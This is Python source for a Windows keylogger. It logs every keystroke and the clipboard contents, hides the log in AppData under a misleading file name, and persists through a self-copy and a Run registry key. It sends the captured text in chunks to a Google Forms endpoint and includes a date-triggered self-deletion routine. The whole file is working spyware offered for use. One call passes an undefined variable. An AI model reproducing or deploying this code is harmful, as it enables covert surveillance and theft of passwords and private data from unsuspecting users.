from pynput import keyboard
import random, requests, os, sys, clipboard, hashlib
from datetime import datetime
from winreg import OpenKey, CloseKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
#Author TrG-1999
logdata = ""
hashclipboard = ""
lenlog = random.randint(180,280)
kbsize = random.randint(4,8)
#if endkeyword is ']',it willn't backspace
def check_speccode(data):
	size = len(data)
	if size > 0:
		if data[size-1] != "]":
			data = data[:size-1]
	return data

def on_press(key):
	global logdata
	global lenlog
	try:
		#Alphanumeric key pressed
		logdata = logdata + str(key.char)
	except AttributeError:
		if key == keyboard.Key.space:
			logdata = logdata + " "
		elif key == keyboard.Key.backspace:
			logdata = check_speccode(logdata)
		else:
			logdata = logdata + " ["+str(key)[4:]+"]"
			#special key pressed
	try:
		if len(logdata) > lenlog:
			dirfile = os.environ["appdata"]+"\\wnettrg.txt"
			# print(len(logdata))
			with open(dirfile, 'a',encoding='utf-8') as file:
				file.write(logdata)
				file.write("\n")
				logdata = ""
				#random 180 word - 280 word
				lenlog = random.randint(180,280)
			sendfile_Kb()
			
	except Exception as e:
		logdata = ""
		# print(e,logdata)

def on_release(key):
	#Key released
	global logdata
	global hashclipboard
	clip = clipboard.paste()
	hashclip = hashlib.md5(clip.encode('utf-8')).hexdigest()
	if key == keyboard.Key.ctrl_l:
		if hashclipboard != hashclip:
			hashclipboard = hashclip
			logdata = logdata + clip

def addStartup():
	new_file_path = os.environ["appdata"]+"\\"+os.path.basename(sys.executable)
	if not os.path.isfile(new_file_path):
		os.system('copy '+sys.executable+' '+new_file_path)
		keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
		key2change = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
		SetValueEx(key2change, "wnettrg",0,REG_SZ, new_file_path)
		CloseKey(key2change)
		#Run new location program
		dircmd = os.environ["appdata"]+"\\"+"del.cmd"
		with open(dircmd,"w+") as newfile:
			pth =  "start /B "+new_file_path
			dlt = "del /q "+dircmd
			newfile.write('taskkill /f /im "'+os.path.basename(sys.executable)+'" ' +'\n'+pth+'\n'+dlt)
		os.system(dircmd)

def all_remover(dst):
	dirr = os.environ["appdata"]
	dircmd = dirr+"\\"+"del.cmd"
	if (dst <= str(datetime.now())[:10]):
		pth = "del /q "+dirr+"\\"+os.path.basename(sys.executable)
		dlt = "del /q "+dircmd
		dlg = "del /q "+dirr+"\\wnettrg.txt"
		f = open(dircmd,"w+")
		f.write('taskkill /f /im "'+os.path.basename(sys.executable)+'" ' + '\n' + pth + '\n' + \
			'reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v wnettrg /f' + \
			'\n' + dlg + '\n' + dlt)
		f.close()
		os.system(dircmd)

def remote(data):
	url="https://docs.google.com/forms/d/e/1FAIpQLSduZ_otO6Yx77AVHcYEQSgCpgLnh6Gfhdn3IKXoIIkZR6aDDA/formResponse" #Specify Google Form URL here
	klog={'entry.1613214469':data} #Specify the Field Name here
	try:
		req = requests.post(url,klog)
		return req.status_code
	except Exception as e:
		return 404

def sendfile_Kb():
	global kbsize
	dirfile = os.environ["appdata"]+"\\wnettrg.txt"
	#if size file text >= size kb --> using remote()
	sizefile = os.path.getsize(dirfile)//1000
	if sizefile >= kbsize and sizefile <= 512:
		try:
			req = requests.get('https://www.google.com', timeout=5)
			if req.status_code == 200:
				with open(dirfile,'r',encoding='utf-8') as file:
					ftext = file.read()
					status = remote(ftext[:29000])
				if status == 200:
					with open(dirfile,'w',encoding='utf-8') as file:
						file.write(ftext[29000:])
					kbsize = random.randint(4,8)
			else:
				kbsize+=1
		except Exception as e:
			kbsize+=1
	elif sizefile > 512:
		kbsize = random.randint(4,8)
		with open(dirfile,'w',encoding='utf-8') as file:
			file.write("")
	
# Collect events until released
addStartup()
all_remover(dst)
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()